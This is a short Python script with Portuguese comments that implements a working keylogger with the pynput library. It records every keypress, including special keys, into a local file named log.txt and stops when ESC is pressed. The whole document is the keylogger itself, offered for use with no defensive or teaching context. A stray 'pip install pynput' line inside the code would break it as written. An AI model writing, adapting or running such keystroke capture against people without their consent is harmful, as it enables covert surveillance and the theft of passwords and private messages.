pip install pynput

from pynput.keyboard import Key, Listener

# Caminho do arquivo onde as teclas serão salvas
log_file = "log.txt"

def on_press(key):
    try:
        # Tenta capturar letras, números e símbolos
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Captura teclas especiais (Espaço, Enter, Shift, etc.)
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{str(key)}] ")

def on_release(key):
    # Atalho para parar o script: Tecla ESC
    if key == Key.esc:
        return False

print("Keylogger iniciado... Pressione 'ESC' para parar.")

# Inicia o monitoramento das teclas
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
